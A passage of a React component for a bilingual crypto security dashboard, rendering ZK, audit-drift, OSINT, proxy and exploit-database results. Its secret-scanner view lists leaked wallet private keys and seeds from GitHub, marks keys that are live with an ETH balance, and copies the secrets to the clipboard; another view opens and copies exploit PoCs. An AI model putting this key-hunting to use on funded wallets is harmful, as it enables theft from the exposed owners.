                <p className="text-[10px] uppercase text-muted-foreground">ZK Radar v4 Match</p>
                <p className="mt-1 font-bold text-green-400">
                  ✅ {result.radar_metadata.discovery_method || "Indexed"}
                </p>
              </div>
              <div className="rounded-lg border border-border bg-background p-3">
                <p className="text-[10px] uppercase text-muted-foreground">Deploy Block</p>
                <p className="mt-1 font-bold text-foreground">
                  {result.radar_metadata.deploy_block || "—"}
                </p>
              </div>
              <div className="rounded-lg border border-border bg-background p-3">
                <p className="text-[10px] uppercase text-muted-foreground">Bytecode Size</p>
                <p className="mt-1 font-bold text-foreground">
                  {result.radar_metadata.bytecode_size || 0} bytes
                </p>
              </div>
              <div className="rounded-lg border border-border bg-background p-3">
                <p className="text-[10px] uppercase text-muted-foreground">Deployer EOA</p>
                <p className="mt-1 truncate font-bold text-primary">
                  {result.radar_metadata.deployer || "—"}
                </p>
              </div>
            </div>
          )}

          {Array.isArray(result.results) && result.results.length > 0 ? (
            <div className="space-y-2">
              {result.results.map((f: any, idx: number) => (
                <div key={idx} className="rounded-lg border border-border bg-background p-3 space-y-1">
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-foreground">{f.title || f.vuln_type || "ZK Finding"}</span>
                    <span className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold text-primary">
                      {f.severity || "INFO"}
                    </span>
                  </div>
                  {f.description && <p className="text-[11px] text-muted-foreground">{f.description}</p>}
                </div>
              ))}
            </div>
          ) : (
            <p className="text-[11px] text-muted-foreground">
              {isRu
                ? "Уязвимостей кривой BN254, gamma==delta, подгрупповых атак G1/G2 или переполнения публичных входов не обнаружено."
                : "No BN254 curve membership, gamma==delta, G1/G2 subgroup, or public input overflow flaws detected."}
            </p>
          )}
        </div>
      )}

      {result && tool === "drift" && (
        <div className="space-y-4">
          {result.mode === "repo_audit_drift" ? (
            <>
              <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
                {[
                  {
                    k: isRu ? "Найдено PDF аудитов" : "Audit PDFs Found",
                    v: result.audits_exist ? `${result.audit_count} PDF` : isRu ? "0 (Нет аудитов)" : "0 (None)",
                  },
                  {
                    k: isRu ? "Последний аудит" : "Last Audit Date",
                    v: result.last_audit_date
                      ? `${result.last_audit_date} (${result.audit_age_days}d · ${result.audit_recency})`
                      : "—",
                  },
                  {
                    k: "Drift Score",
                    v: `${result.drift_score ?? 0}/100`,
                  },
                  {
                    k: isRu ? "Общий риск дрифта" : "Overall Drift Risk",
                    v: result.overall_risk || "UNKNOWN",
                  },
                ].map((c, i) => (
                  <div key={i} className="rounded-xl border border-border bg-card p-4">
                    <p className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                    <p className="mt-1 font-mono text-base font-bold text-foreground">{c.v}</p>
                  </div>
                ))}
              </div>

              <div className="rounded-xl border border-border bg-card p-5 font-mono text-xs space-y-3">
                <div className="flex flex-wrap items-center justify-between gap-2">
                  <div>
                    <a
                      href={result.repo_url}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-sm font-bold text-primary hover:underline"
                    >
                      📦 {result.repo}
                    </a>
                    {result.auditors?.length > 0 && (
                      <p className="mt-1 text-muted-foreground">
                        {isRu ? "Аудиторы:" : "Auditors:"}{" "}
                        <b className="text-foreground">{result.auditors.join(", ")}</b> ·{" "}
                        {isRu ? "Всего находок в отчётах:" : "Total findings in PDFs:"}{" "}
                        <b className="text-primary">{result.total_audit_findings}</b>
                      </p>
                    )}
                  </div>
                  <span className="rounded border border-border bg-background px-2.5 py-1 text-[11px] text-muted-foreground">
                    Contracts: <b className="text-foreground">{result.repo_surface?.contracts_count ?? 0}</b> · Mocks/Tests:{" "}
                    <b className="text-foreground">{result.repo_surface?.mocks_and_tests_count ?? 0}</b>
                  </span>
                </div>

                {result.key_concerns?.length > 0 && (
                  <div className="space-y-1 rounded-lg border border-destructive/30 bg-destructive/10 p-3">
                    {result.key_concerns.map((kc: string, idx: number) => (
                      <p key={idx} className="text-destructive font-semibold">{kc}</p>
                    ))}
                  </div>
                )}

                {result.parsed_audits?.length > 0 && (
                  <div>
                    <p className="mb-2 text-[10px] uppercase tracking-wider text-primary font-semibold">
                      {isRu ? "Разобранные аудиторские отчёты в репозитории" : "Parsed Audit Reports in Repository"}
                    </p>
                    <div className="space-y-1.5">
                      {result.parsed_audits.map((pa: any, idx: number) => (
                        <div key={idx} className="flex flex-wrap items-center justify-between gap-2 rounded-lg border border-border bg-background px-3 py-2">
                          <div>
                            <span className="font-bold text-foreground">{pa.auditor}</span>
                            <span className="ml-2 text-muted-foreground">({pa.file})</span>
                          </div>
                          <div className="flex items-center gap-3 text-[11px]">
                            <span className="text-muted-foreground">{pa.date}</span>
                            <span>
                              C:<b className="text-destructive">{pa.critical}</b> H:<b className="text-primary">{pa.high}</b> M:{pa.medium} L:{pa.low}
                            </span>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {result.drift && (
                  <div className="rounded-lg border border-border bg-background p-3.5 space-y-2">
                    <div className="flex flex-wrap items-center justify-between gap-2">
                      <span className="font-bold text-primary uppercase text-[11px]">
                        🔄 Git Drift ({result.drift.audit_commit || "audit"} → {result.drift.current_commit})
                      </span>
                      <span className="text-[11px] text-muted-foreground">
                        +{result.drift.files_added} added · ~{result.drift.files_modified} modified · -{result.drift.files_removed} removed
                        {result.drift.requires_reaudit ? " · ⚠️ RE-AUDIT RECOMMENDED" : ""}
                      </span>
                    </div>
                    {result.drift.new_contracts?.length > 0 && (
                      <p className="text-[11px] text-destructive">
                        <b>{isRu ? "Новые контракты после аудита:" : "New contracts since audit:"}</b>{" "}
                        {result.drift.new_contracts.slice(0, 10).join(", ")}
                      </p>
                    )}
                    {result.drift.modified_contracts?.length > 0 && (
                      <p className="text-[11px] text-muted-foreground">
                        <b className="text-foreground">{isRu ? "Изменённые контракты:" : "Modified contracts:"}</b>{" "}
                        {result.drift.modified_contracts
                          .slice(0, 8)
                          .map((mc: any) => (typeof mc === "string" ? mc : mc.file || mc.path || JSON.stringify(mc)))
                          .join(", ")}
                      </p>
                    )}
                  </div>
                )}

                {!result.audits_exist && (
                  <div className="rounded-lg border border-amber-500/40 bg-amber-500/10 p-3 text-amber-300">
                    {isRu
                      ? "В репозитории не обнаружено PDF-отчётов аудита в папках audits/ или security/. Весь смарт-контрактный код является неаудированной поверхностью."
                      : "No PDF audit reports found in audits/ or security/ directories. All smart contracts in this repository represent unaudited surface."}
                  </div>
                )}
              </div>
            </>
          ) : (
            <>
              <div className="grid grid-cols-3 gap-3">
                {[
                  { k: "Δ Total", v: result.delta_total },
                  { k: "Δ Critical", v: result.delta_critical },
                  { k: "Δ High", v: result.delta_high },
                ].map((c, i) => (
                  <div key={i} className="rounded-xl border border-border bg-card p-4 text-center">
                    <p className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                    <p className={`mt-1 font-mono text-xl font-bold ${Number(c.v) > 0 ? "text-destructive" : Number(c.v) < 0 ? "text-primary" : "text-foreground"}`}>
                      {Number(c.v) > 0 ? `+${c.v}` : c.v}
                    </p>
                  </div>
                ))}
              </div>
              <div className="rounded-xl border border-border bg-card p-5 font-mono text-xs">
                <p className="text-muted-foreground">{result.target}</p>
                <p className="mt-1 text-foreground">{result.old_verdict} → {result.new_verdict}</p>
                {result.added_patterns?.length > 0 && (
                  <p className="mt-2 text-destructive">+ {result.added_patterns.map((a: any) => `${a.type}×${a.count}`).join(", ")}</p>
                )}
                {result.resolved_patterns?.length > 0 && (
                  <p className="mt-1 text-primary">− {result.resolved_patterns.map((a: any) => `${a.type}×${a.count}`).join(", ")}</p>
                )}
              </div>
            </>
          )}
        </div>
      )}

      {result && tool === "social" && (
        <div className="space-y-4">
          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            {[
              { k: isRu ? "Проект" : "Project", v: result.project_id },
              { k: "Trust Score", v: `${result.trust_score}/100` },
              { k: "Social Risk", v: `${result.social_score}/100` },
              { k: isRu ? "Сигналы" : "Signals", v: result.signals_total },
            ].map((c, i) => (
              <div key={i} className="rounded-xl border border-border bg-card p-4">
                <p className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                <p className="mt-1 truncate font-mono text-lg font-bold text-foreground">{c.v}</p>
              </div>
            ))}
          </div>
          {result.platforms?.length > 0 && (
            <div className="rounded-xl border border-border bg-card p-5">
              <p className="mb-2 font-mono text-[10px] uppercase tracking-wider text-primary">
                {isRu ? "Платформы" : "Platforms"}
              </p>
              <div className="space-y-1.5">
                {result.platforms.map((p: any, i: number) => (
                  <div key={i} className="flex items-center justify-between gap-3 rounded-lg border border-border bg-background px-3 py-2 font-mono text-xs">
                    <span className="font-bold uppercase text-primary">{p.platform}</span>
                    <span className="flex-1 truncate text-muted-foreground">{p.url}</span>
                    <span className="text-foreground">{fmt(p.followers, 0)} followers</span>
                  </div>
                ))}
              </div>
            </div>
          )}
          {result.signals?.length > 0 && (
            <div className="rounded-xl border border-border bg-card p-5 space-y-2">
              <p className="font-mono text-[10px] uppercase tracking-wider text-primary">{isRu ? "OSINT Сигналы" : "OSINT Signals"}</p>
              {result.signals.map((s: any, i: number) => (
                <div key={i} className="rounded-lg border border-border bg-background p-3 font-mono text-xs">
                  <div className="flex justify-between">
                    <span className="font-bold text-foreground">{s.type}</span>
                    <span className="text-muted-foreground">{s.platform} · {s.severity}</span>
                  </div>
                  <p className="mt-1 text-muted-foreground">{s.description}</p>
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {result && tool === "soroban" && (
        <div className="space-y-4">
          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            {[
              { k: isRu ? "Вердикт" : "Verdict", v: result.verdict || "—" },
              { k: "Overall Risk", v: `${result.overall_risk_score ?? 0}/100` },
              { k: "Trustlines", v: fmt(result.asset_profile?.trustlines, 0) },
              { k: "Bid Depth", v: `$${fmt(result.orderbook?.bid_depth_usd)}` },
            ].map((c, i) => (
              <div key={i} className="rounded-xl border border-border bg-card p-4">
                <p className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                <p className="mt-1 font-mono text-lg font-bold text-foreground">{c.v}</p>
              </div>
            ))}
          </div>
          <div className="rounded-xl border border-border bg-card p-5 font-mono text-xs space-y-2">
            <p className="text-foreground font-bold">{result.target} ({result.target_type})</p>
            {result.verdict_detail && <p className="text-muted-foreground">{result.verdict_detail}</p>}
            {result.asset_profile?.home_domain && (
              <p className="text-primary">Domain: {result.asset_profile.home_domain} · LP Pools: {result.lp_pool_count ?? 0}</p>
            )}
            {result.signals?.length > 0 && (
              <div className="mt-3 space-y-1.5">
                {result.signals.map((s: any, i: number) => (
                  <div key={i} className="rounded-lg border border-border bg-background p-2.5">
                    <div className="flex justify-between">
                      <span className="font-bold text-foreground">{s.title || s.id}</span>
                      <span className="text-muted-foreground">{s.severity}</span>
                    </div>
                    <p className="mt-1 text-muted-foreground">{s.description}</p>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {result && tool === "ospec" && (
        <div className="space-y-4">
          <div className="grid grid-cols-2 gap-3 sm:grid-cols-5">
            {[
              {
                k: isRu ? "🟢 Подтверждённые REAL" : "🟢 Verified REAL",
                v: fmt(result.db_stats?.real_findings ?? result.db_stats?.indexed_findings, 0),
                sub: isRu
                  ? `из ${fmt(result.db_stats?.indexed_findings, 0)} проверенных`
                  : `of ${fmt(result.db_stats?.indexed_findings, 0)} scanned`,
              },
              {
                k: isRu ? "🔥 Живые ключи (LIVE)" : "🔥 Live Verified Keys",
                v: fmt(result.db_stats?.live_keys ?? 0, 0),
                sub: isRu ? "активный баланс / RPC / nonce" : "active on-chain / RPC",
              },
              {
                k: isRu ? "📦 Просканировано репо" : "📦 Scanned Repos",
                v: fmt(result.db_stats?.indexed_repos, 0),
                sub: isRu
                  ? `${fmt(result.db_stats?.real_repos ?? 0, 0)} репо с REAL`
                  : `${fmt(result.db_stats?.real_repos ?? 0, 0)} repos w/ REAL`,
              },
              {
                k: "🔴 Critical (REAL)",
                v: fmt(result.db_stats?.by_severity?.CRITICAL ?? 0, 0),
                sub: isRu ? "приватники / seed / prod" : "privkeys / seeds / prod",
              },
              {
                k: "🟠 High (REAL)",
                v: fmt(result.db_stats?.by_severity?.HIGH ?? 0, 0),
                sub: isRu ? `Радар: ${fmt(result.db_stats?.radar_total ?? 0, 0)} репо` : `Radar: ${fmt(result.db_stats?.radar_total ?? 0, 0)} repos`,
              },
            ].map((c, i) => (
              <div key={i} className="rounded-xl border border-border bg-card p-4">
                <p className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                <p className="mt-1 font-mono text-lg font-bold text-foreground">{c.v}</p>
                {c.sub && <p className="mt-0.5 font-mono text-[10px] text-muted-foreground">{c.sub}</p>}
              </div>
            ))}
          </div>

          <div className="rounded-xl border border-border bg-card p-5">
            <div className="mb-3 flex flex-wrap items-center justify-between gap-2">
              <p className="font-mono text-[11px] uppercase tracking-wider text-primary font-bold">
                🔐 {isRu ? "OSPEC — Сгруппированные находки по репозиториям (L2.5 Filtered)" : "OSPEC — Grouped Secret Findings by Repository (L2.5 Filtered)"}
              </p>
              <div className="flex flex-wrap items-center gap-2 font-mono text-[11px] text-muted-foreground">
                <span>
                  Mode: <b className="text-foreground">{result.filter_mode}</b> ·{" "}
                  <b className="text-foreground">{fmt(result.total_groups ?? result.findings_returned, 0)}</b> groups
                </span>
                {Number(result.total_groups || 0) > Number(result.limit || 15) && (
                  <div className="flex items-center gap-1 ml-2">
                    <button
                      type="button"
                      disabled={ospecOffset <= 0 || loading}
                      onClick={() => {
                        const step = Number(result.limit || 15);
                        runOspecWithFilters({ offset: Math.max(0, ospecOffset - step) });
                      }}
                      className="rounded border border-border bg-background px-2 py-0.5 text-[10px] font-semibold text-foreground hover:border-primary disabled:opacity-40"
                    >
                      ⬅️ {isRu ? "Назад" : "Prev"}
                    </button>
                    <span className="px-1.5 text-[10px] text-foreground">
                      {Math.floor(ospecOffset / Number(result.limit || 15)) + 1} /{" "}
                      {Math.max(1, Math.ceil(Number(result.total_groups || 1) / Number(result.limit || 15)))}
                    </span>
                    <button
                      type="button"
                      disabled={ospecOffset + Number(result.limit || 15) >= Number(result.total_groups || 0) || loading}
                      onClick={() => {
                        const step = Number(result.limit || 15);
                        runOspecWithFilters({ offset: ospecOffset + step });
                      }}
                      className="rounded border border-border bg-background px-2 py-0.5 text-[10px] font-semibold text-foreground hover:border-primary disabled:opacity-40"
                    >
                      {isRu ? "Вперёд" : "Next"} ➡️
                    </button>
                  </div>
                )}
              </div>
            </div>

            {!result.findings || result.findings.length === 0 ? (
              <p className="font-mono text-xs text-muted-foreground py-4 text-center">
                {isRu ? "📭 Нет находок по выбранному фильтру" : "📭 No findings match the current filter"}
              </p>
            ) : (
              <div className="space-y-2.5 max-h-[540px] overflow-y-auto pr-1">
                {result.findings.map((f: any) => {
                  const isReal = f.cls === "REAL";
                  return (
                    <div
                      key={f.id}
                      className="rounded-xl border border-border bg-background p-3.5 font-mono text-xs transition-colors hover:border-primary/40"
                    >
                      <div className="flex flex-wrap items-center justify-between gap-2">
                        <div className="flex flex-wrap items-center gap-2">
                          <span
                            className={`rounded px-2 py-0.5 text-[10px] font-bold ${
                              f.severity === "CRITICAL"
                                ? "bg-destructive/20 text-destructive border border-destructive/40"
                                : "bg-primary/15 text-primary border border-primary/40"
                            }`}
                          >
                            {f.severity === "CRITICAL" ? "🔴 CRITICAL" : `🟠 ${f.severity}`}
                          </span>
                          <span
                            className={`rounded px-2 py-0.5 text-[10px] font-bold ${
                              isReal
                                ? "bg-green-500/15 text-green-400 border border-green-500/40"
                                : "bg-muted text-muted-foreground"
                            }`}
                          >
                            {isReal ? "🟢 REAL" : `🧪 ${f.cls || "TEST"}`}
                          </span>
                          <span className="font-bold text-foreground">
                            {f.kind} <span className="text-primary">×{f.hits}</span>
                          </span>
                          {f.is_live && (
                            <span className="rounded bg-amber-500/20 px-2 py-0.5 text-[10px] font-bold text-amber-400">
                              🔥 LIVE
                            </span>
                          )}
                          {f.balance_eth ? (
                            <span className="rounded bg-green-500/20 px-2 py-0.5 text-[10px] font-bold text-green-400">
                              💰 {f.balance_eth} ETH
                            </span>
                          ) : null}
                          {f.nonce ? (
                            <span className="rounded bg-cyan-500/15 px-2 py-0.5 text-[10px] font-bold text-cyan-400">
                              ⚡ nonce {f.nonce}
                            </span>
                          ) : null}
                        </div>
                        <div className="flex items-center gap-2">
                          {f.found_at && (
                            <span className="text-[10px] text-muted-foreground">{f.found_at}</span>
                          )}
                          <button
                            type="button"
                            onClick={() => handleToggleOspecFinding(f.id)}
                            className="inline-flex items-center gap-1 rounded-lg border border-primary/40 bg-primary/10 px-2.5 py-1 font-mono text-[10px] font-semibold text-primary transition-colors hover:bg-primary hover:text-primary-foreground"
                          >
                            <Eye size={11} />
                            <span>
                              {loadingFindingId === f.id
                                ? isRu ? "Загрузка…" : "Loading…"
                                : expandedFindingId === f.id
                                ? isRu ? "Скрыть" : "Close"
                                : isRu ? "Открыть" : "Open"}
                            </span>
                          </button>
                        </div>
                      </div>

                      <div className="mt-2 flex flex-wrap items-center justify-between gap-2 text-[11px]">
                        <a
                          href={f.repo_url}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="font-semibold text-primary hover:underline truncate"
                        >
                          📦 {f.ticker || f.repo_url}
                        </a>
                        {f.gh_url ? (
                          <a
                            href={f.gh_url}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="text-muted-foreground hover:text-foreground truncate"
                          >
                            📄 {f.path}{f.line ? `:${f.line}` : ""} ↗
                          </a>
                        ) : (
                          <span className="text-muted-foreground truncate">
                            📄 {f.path}
                          </span>
                        )}
                      </div>

                      {(f.derived_addr || f.secret_masked) && (
                        <div className="mt-2 flex flex-wrap items-center justify-between gap-2 border-t border-border/60 pt-2 text-[11px] text-muted-foreground">
                          {f.derived_addr ? (
                            <span>
                              🔑 <code className="text-foreground">{f.derived_addr}</code>{" "}
                              {f.derived_chain ? `(${f.derived_chain})` : ""}
                            </span>
                          ) : (
                            <span />
                          )}
                          {f.secret_masked && (
                            <span>
                              Preview: <code className="text-primary">{f.secret_masked}</code>
                            </span>
                          )}
                        </div>
                      )}

                      {expandedFindingId === f.id && findingDetail[f.id] && (
                        <div className="mt-3 rounded-lg border border-primary/30 bg-card p-3 space-y-2">
                          <div className="flex items-center justify-between text-[10px] uppercase tracking-wider text-primary font-bold">
                            <span>
                              {isRu
                                ? `Детализация всех вхождений в репозитории (${findingDetail[f.id].occurrences_count})`
                                : `All Secret Occurrences in Repository (${findingDetail[f.id].occurrences_count})`}
                            </span>
                            <a
                              href={f.repo_url}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="underline hover:text-foreground"
                            >
                              GitHub Repo ↗
                            </a>
                          </div>
                          <div className="space-y-1.5 max-h-60 overflow-y-auto pr-1">
                            {(findingDetail[f.id].occurrences || []).map((occ: any) => (
                              <div
                                key={occ.id}
                                className="flex flex-wrap items-center justify-between gap-2 rounded border border-border bg-background px-2.5 py-1.5 text-[11px]"
                              >
                                <a
                                  href={occ.gh_url || f.repo_url}
                                  target="_blank"
                                  rel="noopener noreferrer"
                                  className="font-semibold text-foreground hover:text-primary truncate max-w-[260px]"
                                >
                                  📄 {occ.path}{occ.line ? `:${occ.line}` : ""} ↗
                                </a>
                                <div className="flex items-center gap-2">
                                  {occ.cls && (
                                    <span
                                      className={`rounded px-1.5 py-0.5 text-[9px] font-bold ${
                                        occ.cls === "REAL"
                                          ? "bg-green-500/15 text-green-400"
                                          : "bg-muted text-muted-foreground"
                                      }`}
                                    >
                                      {occ.cls}
                                    </span>
                                  )}
                                  {occ.is_live && (
                                    <span className="rounded bg-amber-500/20 px-1.5 py-0.5 text-[9px] font-bold text-amber-400">
                                      🔥 LIVE
                                    </span>
                                  )}
                                  <code className="rounded bg-card px-2 py-0.5 text-primary select-all">
                                    {occ.secret_preview}
                                  </code>
                                  <button
                                    type="button"
                                    onClick={() => {
                                      navigator.clipboard.writeText(occ.secret_preview || "");
                                      setCopiedSecretId(String(occ.id));
                                      setTimeout(() => setCopiedSecretId(null), 1500);
                                    }}
                                    className="rounded border border-border p-1 text-muted-foreground hover:border-primary hover:text-primary"
                                    title={isRu ? "Скопировать" : "Copy"}
                                  >
                                    {copiedSecretId === String(occ.id) ? <Check size={11} /> : <Copy size={11} />}
                                  </button>
                                </div>
                              </div>
                            ))}
                          </div>
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        </div>
      )}

      {/* 9. 2,539 Exploits DB (1,678 Deep Writeups + 861 DeFiHackLabs) */}
      {result && tool === "hacks" && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div>
              <span className="text-primary font-bold">
                {result.mode === "kb_search" ? `KB Query: ${result.query}` : result.target}
              </span>
              {result.chain && <span className="ml-2 text-muted-foreground">({result.chain})</span>}
            </div>
            <span className="rounded border border-primary/40 bg-primary/15 px-2.5 py-0.5 text-[11px] font-bold text-primary">
              {result.verdict} {result.total_pattern_risk !== undefined ? `· Score: ${result.total_pattern_risk}` : ""}
            </span>
          </div>

          <div className="grid grid-cols-1 gap-3 sm:grid-cols-3">
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">
                {isRu ? "База подробных разборов (PoC)" : "Deep Writeups DB (PoC)"}
              </p>
              <p className="mt-1 text-sm font-bold text-primary">
                {result.total_writeups_db || 1678} writeups
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">DeFiHackLabs Index</p>
              <p className="mt-1 text-sm font-bold text-foreground">
                {result.total_defihacklabs_db || 861} exploits
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">
                {isRu ? "Суммарная база знаний" : "Combined Exploit KB"}
              </p>
              <p className="mt-1 text-sm font-bold text-green-400">
                {result.total_combined_db || result.total_incidents_in_db || 2539} total incidents
              </p>
            </div>
          </div>

          {/* MODE A: Direct Search across 1,678 Deep Writeups */}
          {result.mode === "kb_search" && Array.isArray(result.writeups) && (
            <div className="space-y-3">
              {result.writeups.map((w: any, idx: number) => {
                const wKey = w.slug || w.title || String(idx);
                const isOpen = expandedWriteupSlug === wKey;
                const wData = writeupCache[wKey];
                return (
                  <div key={idx} className="rounded-lg border border-border bg-background p-4 space-y-2">
                    <div className="flex flex-wrap items-start justify-between gap-2">
                      <div>
                        <div className="flex flex-wrap items-center gap-2">
                          <span className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold text-primary">
                            {w.chain || "EVM"}
                          </span>
                          <span className="text-[10px] text-muted-foreground">{w.date}</span>
                          <span className="font-bold text-sm text-foreground">{w.title}</span>
                        </div>
                        {w.loss && (
                          <p className="mt-1 text-[11px] font-bold text-red-400">
                            💥 Loss: {w.loss}
                          </p>
                        )}
                      </div>
                      <button
                        type="button"
                        onClick={() => handleToggleWriteup(w.slug, w.title)}
                        className="inline-flex items-center gap-1.5 rounded-lg bg-primary px-3 py-1.5 text-[11px] font-semibold text-primary-foreground hover:bg-primary-dim"
                      >
                        <BookOpen size={12} />
                        <span>
                          {loadingWriteupSlug === wKey
                            ? isRu ? "Загрузка…" : "Loading…"
                            : isOpen
                            ? isRu ? "Скрыть разбор" : "Hide Writeup"
                            : isRu ? "Открыть разбор & PoC" : "Open Writeup & PoC"}
                        </span>
                      </button>
                    </div>

                    {w.description && (
                      <p className="text-[11px] text-muted-foreground leading-relaxed">{w.description}</p>
                    )}

                    {Array.isArray(w.tags) && w.tags.length > 0 && (
                      <div className="flex flex-wrap gap-1.5 pt-1">
                        {w.tags.map((tg: string, ti: number) => (
                          <span
                            key={ti}
                            className="rounded border border-border bg-card px-2 py-0.5 text-[10px] text-muted-foreground"
                          >
                            {tg}
                          </span>
                        ))}
                      </div>
                    )}

                    {isOpen && wData && (
                      <div className="mt-3 rounded-xl border border-primary/40 bg-card p-4 space-y-2">
                        {wData.error ? (
                          <p className="text-red-400">⚠️ {wData.error}</p>
                        ) : (
                          <>
                            <div className="flex items-center justify-between border-b border-border pb-2">
                              <span className="text-[11px] font-bold text-primary">
                                📄 {wData.file}
                              </span>
                              <button
                                type="button"
                                onClick={() => navigator.clipboard.writeText(wData.markdown || "")}
                                className="rounded border border-border bg-background px-2.5 py-1 text-[10px] text-muted-foreground hover:border-primary hover:text-primary"
                              >
                                {isRu ? "Скопировать весь разбор + PoC" : "Copy Writeup + PoC"}
                              </button>
                            </div>
                            <pre className="max-h-96 overflow-y-auto whitespace-pre-wrap text-[11px] text-foreground leading-relaxed">
                              {wData.markdown}
                            </pre>
                          </>
                        )}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          )}

          {/* MODE B: 0x Contract Source Cross-Reference */}
          {result.mode !== "kb_search" && (
            <div className="space-y-3">
              {(result.matched_patterns || []).map((mp: any, idx: number) => (
                <div key={idx} className="rounded-lg border border-border bg-background p-3.5 space-y-2">
                  <div className="flex flex-wrap items-center justify-between gap-2">
                    <div className="flex items-center gap-2">
                      <span className="rounded border border-primary/40 bg-primary/15 px-2 py-0.5 text-[10px] font-bold text-primary">
                        Score {mp.score} (hits: {mp.hits})
                      </span>
                      <span className="font-bold text-foreground">{mp.attack_type}</span>
                    </div>
                    <code className="text-[10px] text-muted-foreground">{mp.pattern}</code>
                  </div>
                  <p className="text-[11px] text-muted-foreground">{mp.note}</p>

                  {/* Deep Writeups from the 1,678 DB */}
                  {Array.isArray(mp.deep_writeups) && mp.deep_writeups.length > 0 && (
                    <div className="mt-2 border-t border-border/60 pt-2 space-y-2">
                      <p className="text-[10px] uppercase text-primary font-semibold">
                        {isRu ? "Подробные разборы и Foundry PoC из базы 1,678 взломов:" : "Deep Writeups & Foundry PoCs (1,678 DB):"}
                      </p>
                      {mp.deep_writeups.map((dw: any, di: number) => {
                        const wKey = dw.slug || dw.title || `${idx}_${di}`;
                        const isOpen = expandedWriteupSlug === wKey;
                        const wData = writeupCache[wKey];
                        return (
                          <div key={di} className="rounded border border-border bg-card p-2.5 space-y-1.5">
                            <div className="flex flex-wrap items-center justify-between gap-2">
                              <span className="font-bold text-foreground">{dw.title}</span>
                              <button
                                type="button"
                                onClick={() => handleToggleWriteup(dw.slug, dw.title)}
                                className="inline-flex items-center gap-1 rounded border border-primary/40 bg-primary/10 px-2.5 py-1 text-[10px] font-bold text-primary hover:bg-primary hover:text-primary-foreground"
                              >
                                <BookOpen size={11} />
                                <span>{isOpen ? (isRu ? "Скрыть PoC" : "Hide PoC") : isRu ? "Разбор & PoC" : "Writeup & PoC"}</span>
                              </button>
                            </div>
                            {dw.loss && <p className="text-[10px] text-red-400">Loss: {dw.loss}</p>}
                            {isOpen && wData?.markdown && (
                              <pre className="mt-2 max-h-80 overflow-y-auto rounded border border-border bg-background p-3 whitespace-pre-wrap text-[11px] text-foreground">
                                {wData.markdown}
                              </pre>
                            )}
                          </div>
                        );
                      })}
                    </div>
                  )}

                  {Array.isArray(mp.related_hacks) && mp.related_hacks.length > 0 && (
                    <div className="mt-2 border-t border-border/60 pt-2">
                      <p className="mb-1.5 text-[10px] uppercase text-muted-foreground font-semibold">
                        {isRu ? "Дополнительные инциденты из DeFiHackLabs (861):" : "Additional Precedents (DeFiHackLabs 861):"}
                      </p>
                      <div className="grid grid-cols-1 gap-1.5 sm:grid-cols-2">
                        {mp.related_hacks.map((h: any, hi: number) => (
                          <div key={hi} className="flex items-center justify-between rounded border border-border bg-card px-2.5 py-1.5 text-[11px]">
                            <span className="font-semibold text-foreground truncate">{h.protocol}</span>
                            <span className="text-red-400 font-bold">{h.lost}</span>
                            <span className="text-[10px] text-muted-foreground">{h.date}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* 10. Proxy & EIP-1967 Upgradeability Inspector */}
      {result && tool === "proxy" && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div>
              <span className="text-primary font-bold">{result.address}</span>
              <span className="ml-2 text-muted-foreground">({result.chain})</span>
            </div>
            <span
              className={`rounded border px-2.5 py-0.5 text-[11px] font-bold ${
                result.status === "VULN"
                  ? "border-red-500/50 bg-red-500/15 text-red-400"
                  : "border-green-500/50 bg-green-500/15 text-green-400"
              }`}
            >
              {result.status} · {result.is_proxy ? "PROXY DETECTED" : "STANDALONE CONTRACT"}
            </span>
          </div>

          <div className="grid grid-cols-1 gap-3 sm:grid-cols-3">
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">EIP-1967 Implementation</p>
              <p className="mt-1 truncate font-bold text-foreground">
                {result.eip1967?.implementation || "None (or custom slot)"}
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Proxy Admin Slot</p>
              <p className="mt-1 truncate font-bold text-primary">
                {result.eip1967?.admin || "None"}
              </p>
              <p className="mt-0.5 text-[10px] text-muted-foreground">{result.eip1967?.admin_type}</p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Bytecode Size / Beacon</p>
              <p className="mt-1 font-bold text-foreground">{result.codesize} bytes</p>
              <p className="mt-0.5 truncate text-[10px] text-muted-foreground">
                Beacon: {result.eip1967?.beacon || "—"}
              </p>
            </div>
          </div>

          {(result.targets_checked || []).map((tc: any, idx: number) => (
